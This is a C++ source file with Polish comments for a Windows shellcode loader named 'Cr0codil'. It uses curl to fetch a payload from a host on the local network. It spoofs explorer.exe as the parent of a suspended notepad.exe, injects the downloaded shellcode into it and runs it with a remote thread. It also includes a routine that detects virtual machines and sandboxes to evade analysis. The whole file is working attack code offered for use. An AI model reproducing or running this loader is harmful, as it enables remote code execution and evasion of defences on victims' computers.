// Cr0codil.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <iostream>
#include <windows.h>
#include <IPHlpApi.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>        // <-- dodane dla std::vector
#include <cctype>        // dla isprint (opcjonalnie)

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "IPHlpApi.lib")

bool dynamicAnalysisCheck();

int main()
{
    FILE* fpipe;
    const char* command = "curl http://192.168.0.32:8000/payload.bin"; // ustaw swój adres
    std::vector<char> shellcode;   // dynamiczny bufor na payload
    char buffer[4096];             // tymczasowy bufor do odczytu
    size_t bytesRead;

    // Otwarcie potoku w trybie binarnym ("rb") – ważne dla danych binarnych
    if (0 == (fpipe = (FILE*)_popen(command, "rb"))) {
        perror("popen() failed.\n");
        exit(EXIT_FAILURE);
    }

    printf("Downloading payload...\n");

    // Odczytuj dane porcjami i dodawaj do wektora
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);

        // Opcjonalne wyświetlanie pobranych bajtów (tylko drukowalne znaki)
        for (size_t i = 0; i < bytesRead; ++i) {
            if (isprint(static_cast<unsigned char>(buffer[i])))
                putchar(buffer[i]);
            else
                putchar('.');
        }
    }
    _pclose(fpipe);

    if (shellcode.empty()) {
        printf("\nNo payload downloaded or empty file.\n");
        return 1;
    }

    printf("\n\nPayload downloaded successfully. Size: %zu bytes\n", shellcode.size());

    // ------------------- Pobieranie listy procesów i znalezienie explorer.exe -------------------
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    HANDLE hExplorerexe = NULL;

    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);

    for (int i = 0; i < runningProcessesCount; i++) {
        if (runningProcessesIDs[i] != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
            if (!hProcess) {
                continue;
            }
            char processName[MAX_PATH + 1];
            DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
            if (size == 0) {
                CloseHandle(hProcess);
                continue;
            }
            processName[size] = '\0'; // Ensure null-termination
            _strlwr_s(processName);
            if (strstr(processName, "explorer.exe") && hProcess) {
                if (hExplorerexe) {
                    CloseHandle(hExplorerexe);
                }
                hExplorerexe = hProcess;
            }
            else {
                CloseHandle(hProcess);
            }
        }
    }

    // ------------------- Opcjonalne sprawdzenia anty-debug / VM (zakomentowane) -------------------
    // bool checkStatus = dynamicAnalysisCheck();
    // if (IsDebuggerPresent() == true && checkStatus == false) {
    //     printf("Dynamic analysis check returned VM or debugger presence. Exiting...\n");
    //     return 0;
    // }

    // ------------------- Tworzenie procesu Notepad.exe z explorer.exe jako rodzicem -------------------
    {
        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        SIZE_T attributeSize;
        int exitCode = 1;
        void* exec = NULL;
        HANDLE hThread = NULL;
        RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
        if (hExplorerexe) {
            UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);
        }
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,
                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
                            &si.StartupInfo, &pi)) {
            printf("Failed to create process. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        printf("Process created with PID: %d\n", pi.dwProcessId);

        // ------------------- Wstrzyknięcie i uruchomienie shellcode'u -------------------
        const SIZE_T payloadSize = shellcode.size();

        exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!exec) {
            printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        SIZE_T written;
        if (!WriteProcessMemory(pi.hProcess, exec, shellcode.data(), payloadSize, &written) || written != payloadSize) {
            printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        DWORD oldProtect = 0;
        if (!VirtualProtectEx(pi.hProcess, exec, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
            printf("VirtualProtectEx failed. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        if (!hThread) {
            printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            printf("ResumeThread failed. Error: %d\n", GetLastError());
            goto process_cleanup;
        }

        exitCode = 0;

    process_cleanup:
        if (hThread) {
            CloseHandle(hThread);
        }
        if (exec && pi.hProcess) {
            VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
        }
        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
        }
        if (pi.hThread) {
            CloseHandle(pi.hThread);
        }
        if (si.lpAttributeList) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            delete[] reinterpret_cast<byte*>(si.lpAttributeList);
        }
        if (hExplorerexe) {
            CloseHandle(hExplorerexe);
        }
        return exitCode;
    }

    return 0;
}

// Funkcja sprawdzająca środowisko (VM / debugger) – niezmieniona
bool dynamicAnalysisCheck() {
    // Sprawdzenie CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;

    // Sprawdzenie RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return false;

    // Sprawdzenie HDD
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return false;
    }
    CloseHandle(hDevice);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return false;

    // Sprawdzenie obecności plików VirtualBox
    WIN32_FIND_DATAW findFileData;
    if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

    // Sprawdzenie połączenia internetowego (oryginalnie oczekiwał odpowiedzi 1337 – zakomentowane)
    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnection) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    if (!hRequest) {
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }
    DWORD responseLength;
    if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    if (!response) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }
    if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
        HeapFree(GetProcessHeap(), 0, response);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }
    if (response) {
        HeapFree(GetProcessHeap(), 0, response);
    }
    if (hRequest) {
        WinHttpCloseHandle(hRequest);
    }
    if (hConnection) {
        WinHttpCloseHandle(hConnection);
    }
    if (hSession) {
        WinHttpCloseHandle(hSession);
    }
    // if (atoi((PSTR)response) != 1337) return false;

    return true;
}
